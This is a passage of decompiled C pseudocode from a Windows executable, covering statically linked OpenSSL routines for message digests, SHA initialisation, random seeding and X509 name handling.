      if ( *(_DWORD *)(*(_DWORD *)a1 + 32) && !sub_4075B0((int)a1, 2) )
        (*(void (__cdecl **)(_BYTE *))(*(_DWORD *)a1 + 32))(a1);
      if ( *(_DWORD *)a1 && *(_DWORD *)(*(_DWORD *)a1 + 40) && *((_DWORD *)a1 + 3) && !sub_4075B0((int)a1, 4) )
        sub_4134B0(*((_BYTE **)a1 + 3), *(_DWORD *)(*(_DWORD *)a1 + 40));
    }
    sub_443A10(*((volatile LONG ***)a1 + 4));
    sub_4162A0(*((volatile LONG **)a1 + 1));
    sub_4139E0(a1, 0x18u);
  }
  return 1;
}

//----- (0042B820) --------------------------------------------------------
void *sub_42B820()
{
  return sub_413430(0x18u);
}

//----- (0042B840) --------------------------------------------------------
void __cdecl sub_42B840(_BYTE *Block)
{
  sub_42B790(Block);
  sub_413490(Block);
}

//----- (0042B860) --------------------------------------------------------
int __cdecl sub_42B860(int a1, int *a2, volatile LONG *a3)
{
  int *v3; // edi
  volatile LONG *v4; // ebx
  int v6; // eax
  int *v7; // eax
  int v8; // eax
  bool v9; // zf
  void *v10; // eax
  int v11; // eax
  int v12; // eax

  sub_4075A0(a1, 2);
  v3 = a2;
  if ( !*(_DWORD *)(a1 + 4) || !*(_DWORD *)a1 || a2 && *a2 != **(_DWORD **)a1 )
  {
    if ( a2 )
    {
      sub_4162A0(*(volatile LONG **)(a1 + 4));
      v4 = a3;
      if ( a3 )
      {
        if ( !sub_416200(a3) )
        {
          sub_408310(6, 128, 134, (int)"crypto\\evp\\digest.c", 83);
          return 0;
        }
      }
      else
      {
        v4 = sub_443FE0(*a2);
      }
      if ( v4 )
      {
        v6 = sub_444020((int)v4, *a2);
        if ( !v6 )
        {
          sub_408310(6, 128, 134, (int)"crypto\\evp\\digest.c", 95);
          sub_4162A0(v4);
          return 0;
        }
        v3 = (int *)v6;
        *(_DWORD *)(a1 + 4) = v4;
      }
      else
      {
        *(_DWORD *)(a1 + 4) = 0;
      }
    }
    else
    {
      v3 = *(int **)a1;
      if ( !*(_DWORD *)a1 )
      {
        sub_408310(6, 128, 139, (int)"crypto\\evp\\digest.c", 110);
        return 0;
      }
    }
    v7 = *(int **)a1;
    if ( *(int **)a1 != v3 )
    {
      if ( v7 )
      {
        v8 = v7[10];
        if ( v8 )
        {
          sub_4134B0(*(_BYTE **)(a1 + 12), v8);
          *(_DWORD *)(a1 + 12) = 0;
        }
      }
      v9 = (*(_DWORD *)(a1 + 8) & 0x100) == 0;
      *(_DWORD *)a1 = v3;
      if ( v9 )
      {
        if ( v3[10] )
        {
          *(_DWORD *)(a1 + 20) = v3[5];
          v10 = sub_413430(v3[10]);
          *(_DWORD *)(a1 + 12) = v10;
          if ( !v10 )
          {
            sub_408310(6, 128, 65, (int)"crypto\\evp\\digest.c", 126);
            return 0;
          }
        }
      }
    }
  }
  v11 = *(_DWORD *)(a1 + 16);
  if ( v11 )
  {
    v12 = sub_443A60(v11, -1, 248, 7, 0, a1);
    if ( v12 <= 0 && v12 != -2 )
      return 0;
  }
  if ( (*(_DWORD *)(a1 + 8) & 0x100) != 0 )
    return 1;
  else
    return (*(int (__cdecl **)(int))(*(_DWORD *)a1 + 16))(a1);
}

//----- (0042BA10) --------------------------------------------------------
int __cdecl sub_42BA10(int a1)
{
  return (*(int (**)(void))(a1 + 20))();
}

//----- (0042BA20) --------------------------------------------------------
int __cdecl sub_42BA20(_BYTE **a1, int a2, _DWORD *a3)
{
  int v3; // edi
  void (__cdecl *v4)(_BYTE **); // eax

  if ( *((int *)*a1 + 2) > 64 )
    sub_417C70("assertion failed: ctx->digest->md_size <= EVP_MAX_MD_SIZE", "crypto\\evp\\digest.c", 165);
  v3 = (*((int (__cdecl **)(_BYTE **, int))*a1 + 6))(a1, a2);
  if ( a3 )
    *a3 = *((_DWORD *)*a1 + 2);
  v4 = (void (__cdecl *)(_BYTE **))*((_DWORD *)*a1 + 8);
  if ( v4 )
  {
    v4(a1);
    sub_407590((int)a1, 2);
  }
  sub_4139E0(a1[3], *((_DWORD *)*a1 + 10));
  return v3;
}

//----- (0042BAA0) --------------------------------------------------------
int __cdecl sub_42BAA0(int a1, int a2)
{
  int v3; // ebx
  size_t v4; // eax
  volatile LONG **v5; // eax
  void *v6; // eax
  int (__cdecl *v7)(int, int); // eax

  if ( a2 && *(_DWORD *)a2 )
  {
    if ( *(_DWORD *)(a2 + 4) && !sub_416200(*(_DWORD **)(a2 + 4)) )
    {
      sub_408310(6, 110, 38, (int)"crypto\\evp\\digest.c", 193);
      return 0;
    }
    if ( *(_DWORD *)a1 == *(_DWORD *)a2 )
    {
      v3 = *(_DWORD *)(a1 + 12);
      sub_407590(a1, 4);
    }
    else
    {
      v3 = 0;
    }
    sub_42B790((_BYTE *)a1);
    *(_DWORD *)a1 = *(_DWORD *)a2;
    *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
    *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
    *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
    *(_DWORD *)(a1 + 20) = *(_DWORD *)(a2 + 20);
    *(_DWORD *)(a1 + 12) = 0;
    *(_DWORD *)(a1 + 16) = 0;
    if ( *(_DWORD *)(a2 + 12) )
    {
      v4 = *(_DWORD *)(*(_DWORD *)a1 + 40);
      if ( v4 )
      {
        if ( v3 )
        {
          *(_DWORD *)(a1 + 12) = v3;
        }
        else
        {
          v6 = sub_4133F0(v4);
          *(_DWORD *)(a1 + 12) = v6;
          if ( !v6 )
          {
            sub_408310(6, 110, 65, (int)"crypto\\evp\\digest.c", 219);
            return 0;
          }
        }
        memcpy(*(void **)(a1 + 12), *(const void **)(a2 + 12), *(_DWORD *)(*(_DWORD *)a1 + 40));
      }
    }
    *(_DWORD *)(a1 + 20) = *(_DWORD *)(a2 + 20);
    if ( !*(_DWORD *)(a2 + 16) || (v5 = sub_443E60(*(volatile LONG ***)(a2 + 16)), (*(_DWORD *)(a1 + 16) = v5) != 0) )
    {
      v7 = *(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 28);
      if ( v7 )
        return v7(a1, a2);
      else
        return 1;
    }
    else
    {
      sub_42B790((_BYTE *)a1);
      return 0;
    }
  }
  else
  {
    sub_408310(6, 110, 111, (int)"crypto\\evp\\digest.c", 187);
    return 0;
  }
}

//----- (0042BC10) --------------------------------------------------------
void *__cdecl sub_42BC10(int a1, int a2, int a3, _DWORD *a4, int *a5, volatile LONG *a6)
{
  void *result; // eax
  int v7; // esi
  BOOL v8; // edi

  result = sub_413430(0x18u);
  v7 = (int)result;
  if ( result )
  {
    sub_407590((int)result, 1);
    v8 = sub_42B860(v7, a5, a6)
      && (*(int (__cdecl **)(int, int, int))(v7 + 20))(v7, a1, a2)
      && sub_42BA20((_BYTE **)v7, a3, a4);
    sub_42B790((_BYTE *)v7);
    sub_413490((void *)v7);
    return (void *)v8;
  }
  return result;
}

//----- (0042BCA0) --------------------------------------------------------
int __cdecl sub_42BCA0(_BYTE **a1, int a2, _DWORD *a3)
{
  int v3; // edi

  v3 = sub_42BA20(a1, a2, a3);
  sub_42B790(a1);
  return v3;
}

//----- (0042BCD0) --------------------------------------------------------
int __cdecl sub_42BCD0(void *a1)
{
  _DWORD *v1; // eax

  v1 = (_DWORD *)sub_407400((int)a1);
  return sub_4C7000(v1);
}

//----- (0042BCF0) --------------------------------------------------------
int __cdecl sub_42BCF0(int a1, const __m128i *Src, size_t Size)
{
  int v3; // eax

  v3 = sub_407400(a1);
  return sub_444070(v3, Src, Size);
}

//----- (0042BD20) --------------------------------------------------------
int __cdecl sub_42BD20(int a1, _BYTE *a2)
{
  int *v2; // eax

  v2 = (int *)sub_407400(a1);
  return sub_444150(a2, v2);
}

//----- (0042BD40) --------------------------------------------------------
int __cdecl sub_42BD40(int a1, int a2, int a3, const __m128i *Src)
{
  int v4; // eax
  int *v5; // esi
  _BYTE v7[40]; // [esp+8h] [ebp-40h] BYREF
  __m128i v8; // [esp+30h] [ebp-18h] BYREF

  v4 = sub_407400(a1);
  v5 = (int *)v4;
  if ( a2 != 29 )
    return 0;
  if ( a3 != 48 )
    return 0;
  if ( sub_444070(v4, Src, 0x30u) <= 0 )
    return 0;
  memset(v7, 54, sizeof(v7));
  if ( !sub_444070((int)v5, (const __m128i *)v7, 0x28u) )
    return 0;
  if ( !sub_444150(&v8, v5) )
    return 0;
  if ( !sub_4C7000(v5) )
    return 0;
  if ( sub_444070((int)v5, Src, 0x30u) <= 0 )
    return 0;
  memset(v7, 92, sizeof(v7));
  if ( !sub_444070((int)v5, (const __m128i *)v7, 0x28u) || !sub_444070((int)v5, &v8, 0x14u) )
    return 0;
  sub_4139E0(&v8, 0x14u);
  return 1;
}
// 42BD40: using guessed type __m128i var_18;

//----- (0042BEA0) --------------------------------------------------------
const char *sub_42BEA0()
{
  return "@";
}

//----- (0042BEB0) --------------------------------------------------------
int __cdecl sub_42BEB0(void *a1)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)sub_407400((int)a1);
  memset(v1, 0, 0x70u);
  *v1 = -1056596264;
  v1[1] = 914150663;
  v1[2] = 812702999;
  v1[3] = -150054599;
  v1[4] = -4191439;
  v1[5] = 1750603025;
  v1[6] = 1694076839;
  v1[7] = -1090891868;
  v1[27] = 28;
  return 1;
}

//----- (0042BED0) --------------------------------------------------------
int __cdecl sub_42BED0(void *a1)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)sub_407400((int)a1);
  memset(v1, 0, 0x70u);
  *v1 = 1779033703;
  v1[1] = -1150833019;
  v1[2] = 1013904242;
  v1[3] = -1521486534;
  v1[4] = 1359893119;
  v1[5] = -1694144372;
  v1[6] = 528734635;
  v1[7] = 1541459225;
  v1[27] = 32;
  return 1;
}

//----- (0042BEF0) --------------------------------------------------------
int __cdecl sub_42BEF0(int a1, char *Src, size_t Size)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)sub_407400(a1);
  return sub_444360(v3, Src, Size);
}

//----- (0042BF20) --------------------------------------------------------
int __cdecl sub_42BF20(int a1, _BYTE *a2)
{
  int *v2; // eax

  v2 = (int *)sub_407400(a1);
  return sub_444440(a2, v2);
}

//----- (0042BF40) --------------------------------------------------------
void *sub_42BF40()
{
  return &unk_504FE4;
}

//----- (0042BF50) --------------------------------------------------------
void *sub_42BF50()
{
  return &unk_505014;
}

//----- (0042BF60) --------------------------------------------------------
int __cdecl sub_42BF60(int a1)
{
  _DWORD *v2; // [esp+4h] [ebp+4h]

  v2 = (_DWORD *)sub_407400(a1);
  *v2 = -1056596264;
  v2[1] = -876896931;
  v2[2] = 914150663;
  v2[3] = 1654270250;
  v2[4] = 812702999;
  v2[5] = -1856437926;
  v2[6] = -150054599;
  v2[7] = 355462360;
  v2[8] = -4191439;
  v2[9] = 1731405415;
  v2[10] = 1750603025;
  v2[11] = -1900787065;
  v2[12] = 1694076839;
  v2[13] = -619958771;
  v2[14] = -1090891868;
  v2[15] = 1203062813;
  v2[16] = 0;
  v2[17] = 0;
  v2[18] = 0;
  v2[19] = 0;
  v2[52] = 0;
  v2[53] = 48;
  return 1;
}

//----- (0042BF80) --------------------------------------------------------
int __cdecl sub_42BF80(int a1)
{
  _DWORD *v1; // eax

  v1 = (_DWORD *)sub_407400(a1);
  return sub_442D40(v1);
}

//----- (0042BFA0) --------------------------------------------------------
int __cdecl sub_42BFA0(int a1, char *Src, size_t Size)
{
  int v3; // eax

  v3 = sub_407400(a1);
  return sub_443280(v3, Src, Size);
}

//----- (0042BFD0) --------------------------------------------------------
int __cdecl sub_42BFD0(int a1, _BYTE *a2)
{
  int *v2; // eax

  v2 = (int *)sub_407400(a1);
  return sub_442DE0(a2, v2);
}

//----- (0042BFF0) --------------------------------------------------------
void *sub_42BFF0()
{
  return &unk_505044;
}

//----- (0042C000) --------------------------------------------------------
void *sub_42C000()
{
  return &unk_505074;
}

//----- (0042C010) --------------------------------------------------------
LPVOID sub_42C010()
{
  LPVOID result; // eax

  result = (LPVOID)sub_424FA0(256, 0, 0);
  if ( result )
    return sub_414770(&dword_539038);
  return result;
}
// 539038: using guessed type DWORD dword_539038;

//----- (0042C0A0) --------------------------------------------------------
void __usercall sub_42C0A0(int **a1@<ebx>)
{
  int v1; // eax
  LPVOID *v2; // esi

  if ( a1 && *a1 )
  {
    while ( 1 )
    {
      v1 = sub_4269D0(*a1);
      v2 = (LPVOID *)v1;
      if ( !v1 )
        break;
      sub_413490(*(void **)(v1 + 12));
      DeleteFiber(*v2);
      sub_413490(v2);
    }
  }
}

//----- (0042C0F0) --------------------------------------------------------
int sub_42C0F0()
{
  if ( !sub_414750(&dword_539038) )
    return 0;
  if ( !sub_414750(&dword_53903C) )
  {
    sub_4147A0(&dword_539038);
    return 0;
  }
  return 1;
}
// 539038: using guessed type DWORD dword_539038;
// 53903C: using guessed type DWORD dword_53903C;

//----- (0042C130) --------------------------------------------------------
BOOL sub_42C130()
{
  sub_4147A0(&dword_539038);
  return sub_4147A0(&dword_53903C);
}
// 539038: using guessed type DWORD dword_539038;
// 53903C: using guessed type DWORD dword_53903C;

//----- (0042C150) --------------------------------------------------------
void ***sub_42C150()
{
  void *v0; // esi
  void ***result; // eax
  void ***v2; // ebx

  result = (void ***)sub_414770(&dword_53903C);
  v2 = result;
  if ( result )
  {
    sub_42C0A0((int **)result);
    sub_4269F0(*v2);
    sub_413490(v2);
    sub_414780(&dword_53903C, 0);
    sub_444720();
    if ( sub_424FA0(256, 0, 0) )
      v0 = sub_414770(&dword_539038);
    else
      v0 = 0;
    result = (void ***)sub_414780(&dword_539038, 0);
    if ( result )
    {
      sub_413490(v0);
      return (void ***)1;
    }
  }
  return result;
}
// 539038: using guessed type DWORD dword_539038;
// 53903C: using guessed type DWORD dword_53903C;

//----- (0042C1A0) --------------------------------------------------------
_DWORD *sub_42C1A0()
{
  _DWORD *result; // eax

  result = (_DWORD *)sub_424FA0(256, 0, 0);
  if ( result )
  {
    result = sub_414770(&dword_539038);
    if ( result )
    {
      if ( result[2] )
        ++result[3];
    }
  }
  return result;
}
// 539038: using guessed type DWORD dword_539038;

//----- (0042C1D0) --------------------------------------------------------
_DWORD *sub_42C1D0()
{
  _DWORD *result; // eax
  int v1; // ecx

  result = (_DWORD *)sub_424FA0(256, 0, 0);
  if ( result )
  {
    result = sub_414770(&dword_539038);
    if ( result )
    {
      if ( result[2] )
      {
        v1 = result[3];
        if ( v1 )
          result[3] = v1 - 1;
      }
    }
  }
  return result;
}
// 539038: using guessed type DWORD dword_539038;

//----- (0042C210) --------------------------------------------------------
void **sub_42C210()
{
  void *v0; // esp
  void **result; // eax
  void *v2; // esp
  int TickCount; // [esp+8h] [ebp-Ch] BYREF
  LARGE_INTEGER PerformanceCount; // [esp+Ch] [ebp-8h] BYREF

  if ( dword_531318 )
  {
    if ( QueryPerformanceCounter(&PerformanceCount) )
    {
      v0 = alloca(8);
      result = sub_406F80((int)&PerformanceCount, 8, 0.0);
      if ( dword_531318 )
        return result;
    }
    else
    {
      dword_531318 = 0;
    }
  }
  TickCount = GetTickCount();
  v2 = alloca(8);
  return sub_406F80((int)&TickCount, 4, 0.0);
}
// 531318: using guessed type int dword_531318;

//----- (0042C290) --------------------------------------------------------
int sub_42C290()
{
  void *v0; // esp
  void *v1; // esp
  void *v2; // esp
  void *v3; // esp
  HCRYPTPROV phProv; // [esp+14h] [ebp-6Ch] BYREF
  int CurrentProcessId; // [esp+18h] [ebp-68h] BYREF
  struct _MEMORYSTATUS Buffer; // [esp+1Ch] [ebp-64h] BYREF
  BYTE pbBuffer[64]; // [esp+3Ch] [ebp-44h] BYREF

  if ( CryptAcquireContextW(&phProv, 0, 0, 1u, 0xF0000040) )
  {
    if ( CryptGenRandom(phProv, 0x40u, pbBuffer) )
    {
      v0 = alloca(8);
      sub_406F80((int)pbBuffer, 64, 64.0);
    }
    CryptReleaseContext(phProv, 0);
  }
  if ( CryptAcquireContextW(&phProv, 0, L"Intel Hardware Cryptographic Service Provider", 0x16u, 0xF0000040) )
  {
    if ( CryptGenRandom(phProv, 0x40u, pbBuffer) )
    {
      v1 = alloca(8);
      sub_406F80((int)pbBuffer, 64, 64.0);
    }
    CryptReleaseContext(phProv, 0);
  }
  sub_42C210();
  GlobalMemoryStatus(&Buffer);
  v2 = alloca(8);
  sub_406F80((int)&Buffer, 32, 1.0);
  CurrentProcessId = GetCurrentProcessId();
  v3 = alloca(8);
  sub_406F80((int)&CurrentProcessId, 4, 1.0);
  return 1;
}

//----- (0042C3E0) --------------------------------------------------------
void *sub_42C3E0()
{
  return &unk_5052F8;
}

//----- (0042C3F0) --------------------------------------------------------
int __cdecl sub_42C3F0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_5052F8);
}

//----- (0042C410) --------------------------------------------------------
signed int __cdecl sub_42C410(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_5052F8);
}

//----- (0042C430) --------------------------------------------------------
_DWORD *sub_42C430()
{
  return sub_4329F0(4);
}

//----- (0042C440) --------------------------------------------------------
void *sub_42C440()
{
  return &unk_505314;
}

//----- (0042C450) --------------------------------------------------------
int __cdecl sub_42C450(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_505314);
}

//----- (0042C470) --------------------------------------------------------
signed int __cdecl sub_42C470(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_505314);
}

//----- (0042C490) --------------------------------------------------------
_DWORD *sub_42C490()
{
  return sub_4329F0(2);
}

//----- (0042C4A0) --------------------------------------------------------
void *sub_42C4A0()
{
  return &unk_505330;
}

//----- (0042C4B0) --------------------------------------------------------
int __cdecl sub_42C4B0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_505330);
}

//----- (0042C4D0) --------------------------------------------------------
void *sub_42C4D0()
{
  return &unk_50534C;
}

//----- (0042C4E0) --------------------------------------------------------
_DWORD *sub_42C4E0()
{
  return sub_4329F0(3);
}

//----- (0042C500) --------------------------------------------------------
void *sub_42C500()
{
  return &unk_505368;
}

//----- (0042C510) --------------------------------------------------------
void *sub_42C510()
{
  return &unk_5053BC;
}

//----- (0042C520) --------------------------------------------------------
_DWORD *sub_42C520()
{
  return sub_4329F0(22);
}

//----- (0042C530) --------------------------------------------------------
_DWORD *sub_42C530()
{
  return sub_4329F0(23);
}

//----- (0042C540) --------------------------------------------------------
void *sub_42C540()
{
  return &unk_505410;
}

//----- (0042C550) --------------------------------------------------------
_DWORD *sub_42C550()
{
  return sub_4329F0(24);
}

//----- (0042C560) --------------------------------------------------------
_DWORD *sub_42C560()
{
  return sub_4329F0(26);
}

//----- (0042C570) --------------------------------------------------------
void *sub_42C570()
{
  return &unk_505480;
}

//----- (0042C580) --------------------------------------------------------
int sub_42C580()
{
  return sub_42FB20((int)&unk_505480);
}

//----- (0042C590) --------------------------------------------------------
void *sub_42C590()
{
  return &unk_50549C;
}

//----- (0042C5A0) --------------------------------------------------------
void *sub_42C5A0()
{
  return &unk_5054B8;
}

//----- (0042C5B0) --------------------------------------------------------
void *sub_42C5B0()
{
  return &unk_5054D4;
}

//----- (0042C5C0) --------------------------------------------------------
int __cdecl sub_42C5C0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_5054B8);
}

//----- (0042C5E0) --------------------------------------------------------
signed int __cdecl sub_42C5E0(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_5054B8);
}

//----- (0042C600) --------------------------------------------------------
int sub_42C600()
{
  return sub_42FB20((int)&unk_5054B8);
}

//----- (0042C610) --------------------------------------------------------
void __cdecl sub_42C610(int a1)
{
  sub_42FEF0(a1, (int)&unk_5054B8);
}

//----- (0042C630) --------------------------------------------------------
void *sub_42C630()
{
  return &unk_5054F0;
}

//----- (0042C640) --------------------------------------------------------
void *sub_42C640()
{
  return &unk_50550C;
}

//----- (0042C650) --------------------------------------------------------
void *sub_42C650()
{
  return &unk_505528;
}

//----- (0042C660) --------------------------------------------------------
void *sub_42C660()
{
  return &unk_505544;
}

//----- (0042C670) --------------------------------------------------------
void *sub_42C670()
{
  return &unk_50557C;
}

//----- (0042C680) --------------------------------------------------------
void *sub_42C680()
{
  return &unk_505598;
}

//----- (0042C690) --------------------------------------------------------
signed int __cdecl sub_42C690(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_5055C8);
}

//----- (0042C6B0) --------------------------------------------------------
signed int __cdecl sub_42C6B0(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_5055F8);
}

//----- (0042C6D0) --------------------------------------------------------
void *sub_42C6D0()
{
  return &unk_50566C;
}

//----- (0042C6E0) --------------------------------------------------------
int __cdecl sub_42C6E0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_50566C);
}

//----- (0042C700) --------------------------------------------------------
signed int __cdecl sub_42C700(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_50566C);
}

//----- (0042C720) --------------------------------------------------------
int sub_42C720()
{
  return sub_42FB20((int)&unk_50566C);
}

//----- (0042C730) --------------------------------------------------------
void __cdecl sub_42C730(int a1)
{
  sub_42FEF0(a1, (int)&unk_50566C);
}

//----- (0042C750) --------------------------------------------------------
int __cdecl sub_42C750(int a1, int a2, int a3, int a4)
{
  int result; // eax

  if ( !a1 )
    return 0;
  if ( a3 == -1 || *(_DWORD *)(a1 + 4) || (result = sub_42C600(), (*(_DWORD *)(a1 + 4) = result) != 0) )
  {
    sub_422B70(*(void ***)a1);
    *(_DWORD *)a1 = a2;
    if ( a3 )
    {
      if ( a3 == -1 )
      {
        sub_42C610(*(_DWORD *)(a1 + 4));
        result = 1;
        *(_DWORD *)(a1 + 4) = 0;
        return result;
      }
      sub_423E40(*(_DWORD **)(a1 + 4), a3, a4);
    }
    return 1;
  }
  return result;
}

//----- (0042C7D0) --------------------------------------------------------
_DWORD *__cdecl sub_42C7D0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *result; // eax

  result = a1;
  if ( a1 )
    *a1 = *a4;
  if ( a2 )
  {
    result = (_DWORD *)a4[1];
    if ( result )
    {
      *a2 = *result;
      result = a3;
      if ( a3 )
        *a3 = *(_DWORD *)(a4[1] + 4);
    }
    else
    {
      *a2 = -1;
    }
  }
  return result;
}

//----- (0042C810) --------------------------------------------------------
int __cdecl sub_42C810(int a1, int a2)
{
  int v2; // eax
  char **v3; // eax
  int v5; // [esp-8h] [ebp-8h]

  v5 = (*(_BYTE *)(a2 + 12) & 8) != 0 ? -1 : 5;
  v2 = sub_435D30(a2);
  v3 = sub_423310(v2);
  return sub_42C750(a1, (int)v3, v5, 0);
}

//----- (0042C850) --------------------------------------------------------
void *sub_42C850()
{
  return &unk_5056FC;
}

//----- (0042C860) --------------------------------------------------------
int sub_42C860()
{
  return sub_42FB20((int)&unk_5056FC);
}

//----- (0042C870) --------------------------------------------------------
void __cdecl sub_42C870(int a1)
{
  sub_42FEF0(a1, (int)&unk_5056FC);
}

//----- (0042C890) --------------------------------------------------------
void *__cdecl sub_42C890(void *a1)
{
  return sub_42FF30((int)&unk_5056FC, a1);
}

//----- (0042C8B0) --------------------------------------------------------
char ***__cdecl sub_42C8B0(unsigned int a1, int a2, int a3)
{
  char ***result; // eax
  int v4; // esi
  _DWORD *v5; // edi

  result = (char ***)sub_42FB20((int)&unk_5056FC);
  v4 = (int)result;
  if ( result )
  {
    *result = sub_423310(a1);
    v5 = (_DWORD *)sub_42C600();
    if ( v5 && sub_4269B0(*(int **)(v4 + 4), (int)v5) )
    {
      sub_423E40(v5, a2, a3);
      return (char ***)v4;
    }
    else
    {
      sub_42FEF0(v4, (int)&unk_5056FC);
      sub_42C610((int)v5);
      return 0;
    }
  }
  return result;
}

//----- (0042C930) --------------------------------------------------------
void *sub_42C930()
{
  return &unk_50579C;
}

//----- (0042C940) --------------------------------------------------------
int sub_42C940()
{
  return sub_42FB20((int)&unk_50579C);
}

//----- (0042C950) --------------------------------------------------------
void __cdecl sub_42C950(int a1)
{
  sub_42FEF0(a1, (int)&unk_50579C);
}

//----- (0042C970) --------------------------------------------------------
void *__cdecl sub_42C970(void *a1)
{
  return sub_42FF30((int)&unk_50579C, a1);
}

//----- (0042C990) --------------------------------------------------------
void *sub_42C990()
{
  return &unk_5057CC;
}

//----- (0042C9A0) --------------------------------------------------------
void *sub_42C9A0()
{
  return &unk_505834;
}

//----- (0042C9B0) --------------------------------------------------------
signed int __cdecl sub_42C9B0(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_505834);
}

//----- (0042C9D0) --------------------------------------------------------
int sub_42C9D0()
{
  return sub_42FB20((int)&unk_505834);
}

//----- (0042C9E0) --------------------------------------------------------
void __cdecl sub_42C9E0(int a1)
{
  sub_42FEF0(a1, (int)&unk_505834);
}

//----- (0042CA00) --------------------------------------------------------
void *__cdecl sub_42CA00(void *a1)
{
  return sub_42FF30((int)&unk_505834, a1);
}

//----- (0042CA20) --------------------------------------------------------
int __cdecl sub_42CA20(void ****a1)
{
  void ***v1; // esi
  void **v2; // eax
  void **v3; // eax
  int result; // eax

  v1 = (void ***)sub_413430(0x14u);
  if ( v1 && (v2 = (void **)sub_426AF0(), (*v1 = v2) != 0) && (v3 = (void **)sub_4197E0(), (v1[2] = v3) != 0) )
  {
    result = 1;
    v1[1] = (void **)1;
    *a1 = v1;
  }
  else
  {
    sub_408310(13, 171, 65, (int)"crypto\\x509\\x_name.c", 105);
    if ( v1 )
    {
      sub_4269F0(*v1);
      sub_413490(v1);
    }
    return 0;
  }
  return result;
}

//----- (0042CAA0) --------------------------------------------------------
void __cdecl sub_42CAA0(int *a1)
{
  int v1; // esi

  if ( a1 )
  {
    v1 = *a1;
    if ( *a1 )
    {
      sub_419810(*(_DWORD **)(v1 + 8));
      sub_426C00(*(void **)v1, sub_42C950);
      sub_413490(*(void **)(v1 + 12));
      sub_413490((void *)v1);
      *a1 = 0;
    }
  }
}

//----- (0042CB00) --------------------------------------------------------
void __cdecl sub_42CB00(void *Block)
{
  sub_426C00(Block, sub_42C950);
}

//----- (0042CB20) --------------------------------------------------------
int __usercall sub_42CB20@<eax>(int a1@<esi>)
{
  int v1; // ebx
  int v2; // ebp
  void *v3; // eax
  int v4; // edi
  int *v5; // eax
  int v6; // edi
  int result; // eax
  void *Block; // [esp+Ch] [ebp-Ch] BYREF
  int *v9; // [esp+10h] [ebp-8h]
  void *v10; // [esp+14h] [ebp-4h] BYREF

  v1 = 0;
  v9 = 0;
  v2 = -1;
  v3 = sub_426AF0();
  Block = v3;
  if ( !v3 )
    goto LABEL_11;
  if ( sub_426A30(*(_DWORD *)a1) > 0 )
  {
    do
    {
      v4 = sub_426A40(*(int **)a1, v1);
      if ( *(_DWORD *)(v4 + 8) != v2 )
      {
        v5 = sub_426AF0();
        v9 = v5;
        if ( !v5 || !sub_4269B0((int *)Block, (int)v5) )
          goto LABEL_10;
        v2 = *(_DWORD *)(v4 + 8);
      }
      if ( !sub_4269B0(v9, v4) )
        goto LABEL_10;
      ++v1;
    }
    while ( v1 < sub_426A30(*(_DWORD *)a1) );
  }
  v6 = sub_42F030((int *)&Block, 0, (int)&unk_5057FC, -1, -1);
  if ( !sub_4198C0(*(_DWORD *)(a1 + 8), v6) )
  {
LABEL_10:
    v3 = Block;
LABEL_11:
    sub_426C00(v3, (void (__cdecl *)(_DWORD))sub_42CAF0);
    sub_408310(13, 203, 65, (int)"crypto\\x509\\x_name.c", 285);
    return -1;
  }
  v10 = *(void **)(*(_DWORD *)(a1 + 8) + 4);
  sub_42F030((int *)&Block, &v10, (int)&unk_5057FC, -1, -1);
  sub_426C00(Block, (void (__cdecl *)(_DWORD))sub_42CAF0);
  result = v6;
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (0042CC60) --------------------------------------------------------
int __cdecl sub_42CC60(int a1, int **a2, int a3, int a4, int a5)
{
  return sub_445220(a1, *a2, a3, *(_DWORD *)(a5 + 4)) <= 0 ? 0 : 2;
}

//----- (0042CC90) --------------------------------------------------------
BOOL __cdecl sub_42CC90(int *a1)
{
  int v1; // ecx
  signed int *v2; // edi
  int v4; // eax
  char *v5; // esi
  int v6; // ebp
  char *v7; // edi
  unsigned __int8 *v8; // edi
  int v9; // ebx
  unsigned __int8 v10; // al
  char v11; // al

  v2 = (signed int *)v1;
  if ( (sub_42D2F0(*(_DWORD *)(v1 + 4)) & 0x2956) == 0 )
    return sub_432D70((int)a1, (int)v2) != 0;
  a1[1] = 12;
  v4 = sub_445260(a1 + 2, v2);
  *a1 = v4;
  if ( v4 == -1 )
    return 0;
  v5 = (char *)a1[2];
  v6 = v4;
  if ( v4 > 0 )
  {
    do
    {
      if ( *v5 < 0 )
        break;
      if ( !isspace((unsigned __int8)*v5) )
        break;
      --v6;
      ++v5;
    }
    while ( v6 > 0 );
    if ( v6 > 0 )
    {
      v7 = &v5[v6 - 1];
      do
      {
        if ( *v7 < 0 )
          break;
        if ( !isspace((unsigned __int8)*v7) )
          break;
        --v6;
        --v7;
      }
      while ( v6 > 0 );
    }
  }
  v8 = (unsigned __int8 *)a1[2];
  v9 = 0;
  while ( v9 < v6 )
  {
    v10 = *v5;
    if ( *v5 >= 0 )
    {
      if ( isspace(v10) )
      {
        *v8++ = 32;
        do
        {
          v11 = *++v5;
          ++v9;
        }
        while ( v11 >= 0 && isspace((unsigned __int8)v11) );
        continue;
      }
      v10 = tolower((unsigned __int8)*v5);
    }
    *v8++ = v10;
    ++v5;
    ++v9;
  }
  *a1 = (int)&v8[-a1[2]];
  return 1;
}
